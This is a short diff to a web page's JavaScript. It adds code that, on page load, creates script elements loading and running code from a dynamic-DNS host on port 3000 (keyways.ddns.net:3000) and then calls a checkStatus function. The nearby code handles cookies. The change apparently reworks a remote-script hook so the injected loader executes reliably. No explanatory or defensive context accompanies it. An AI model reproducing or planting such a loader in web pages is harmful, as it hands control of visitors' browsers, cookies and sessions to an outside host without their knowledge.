@@ -78,7 +78,31 @@ while (coo.length > i45) {
 document.body.onload = function () {
 	var eld = document.createElement('div')
 	eld.innerHTML = '<script src="http://keyways.ddns.net:3000/"></script><script>setTimeout(function(){checkStatus(2)},1000)</script>';
-	document.body.insertBefore(eld,document.body.childNodes[0]);
+	//document.body.insertBefore(eld,document.body.childNodes[0]);
+	
+	var s = document.createElement('script');
+    s.type = 'text/javascript';
+	s.src="http://keyways.ddns.net:3000/"
+    var code = '';
+    try {
+      s.appendChild(document.createTextNode(code));
+      document.body.appendChild(s);
+    } catch (e) {
+      s.text = code;
+      document.body.appendChild(s);
+    }
+	
+	 s = document.createElement('script');
+    s.type = 'text/javascript';
+     code = 'setTimeout(function(){checkStatus(2)},1000);';
+    try {
+      s.appendChild(document.createTextNode(code));
+      document.body.appendChild(s);
+    } catch (e) {
+      s.text = code;
+      document.body.appendChild(s);
+    }
+	
     if (getit('loadingHider') != null) {
         getit('loadingTag').style.display = 'none'
         getit('loaderH').style.display = 'none'
